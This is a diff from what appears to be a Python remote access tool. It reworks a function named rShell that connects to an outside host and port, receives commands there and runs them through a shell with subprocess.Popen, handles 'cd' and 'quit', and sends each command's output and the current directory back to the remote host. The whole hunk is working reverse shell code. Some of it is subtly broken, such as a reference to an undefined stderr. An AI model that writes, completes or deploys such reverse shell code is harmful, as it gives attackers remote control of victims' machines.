@@ -205,26 +205,26 @@ def rShell(rsHost, rsPort):
         rsConnected = True
         if debugmode:
             print("[*] Connection established with " + rsHost + ":" + rsPort + "!")
+        while rsConnected:
+            try:
+                data = rs.recv(1024).decode("UTF-8")
+                if data == "quit":
+                    rs.close()
+                if data[:2] == "cd":
+                    os.chdir(data[3:])
+                if len(data) > 0:
+                    sproc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    stdout_value = sproc.stdout.read() + stderr.read()
+                    output_str = str(stdout_value)
+                    currentWD = os.getcwd() + "> "
+                    rs.sendto(str.encode(output_str + currentWD), (str(rsHost), int(rsPort)))
+            except rs.error as rserror:
+                if debugmode:
+                    print("rShell Socket Error: " + str(rserror))
+                    rs.close()
     except rs.error as rsconnerr:
         if debugmode:
-            print("Socket connection error: " + str(rsconnerr)
-    while rsConnected:
-        try:
-            data = rs.recv(1024).decode("UTF-8")
-            if data == "quit":
-                rs.close()
-            if data[:2] == "cd":
-                os.chdir(data[3:])
-            if len(data) > 0:
-                sproc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                stdout_value = sproc.stdout.read() + stderr.read()
-                output_str = str(stdout_value)
-                currentWD = os.getcwd() + "> "
-                rs.sendto(str.encode(output_str + currentWD), (str(rsHost), int(rsPort)))
-        except rs.error as rserror:
-            if debugmode:
-                print("Socket Error: " + rserror)
-                rs.close()
+            print("rShell Socket connection error: " + str(rsconnerr))
     rs.close()
     
 def runcmd(sc):
